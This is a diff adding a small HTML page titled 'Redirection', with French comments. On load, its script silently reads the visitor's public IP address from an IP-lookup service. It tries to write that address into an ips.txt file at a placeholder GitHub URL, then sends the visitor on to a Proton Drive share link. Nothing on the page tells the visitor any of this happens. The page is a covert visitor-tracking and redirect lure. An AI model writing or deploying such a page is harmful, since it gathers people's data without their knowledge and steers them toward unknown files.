@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirection</title>
+</head>
+<body>
+    <script>
+        (function() {
+            var a = 'https://api.ipify.org?format=json';
+            var b = 'https://drive.proton.me/urls/7MWT2ZBK4M#CelcIjbzZSWY';
+            var c = 'https://raw.githubusercontent.com/votre-utilisateur/votre-depot/main/ips.txt'; // Remplacez par l'URL de votre fichier ips.txt
+
+            fetch(a).then(function(response) { return response.json(); }).then(function(data) {
+                console.log('Adresse IP:', data.ip);
+
+                // Lire le contenu actuel du fichier ips.txt
+                fetch(c).then(function(response) { return response.text(); }).then(function(text) {
+                    // Ajouter la nouvelle adresse IP
+                    var newText = text + '\n' + data.ip;
+
+                    // Écrire le nouveau contenu dans le fichier ips.txt
+                    fetch(c, {
+                        method: 'PUT',
+                        headers: {
+                            'Content-Type': 'text/plain'
+                        },
+                        body: newText
+                    }).then(function() {
+                        window.location.href = b;
+                    });
+                });
+            });
+        })();
+    </script>
+</body>
+</html>
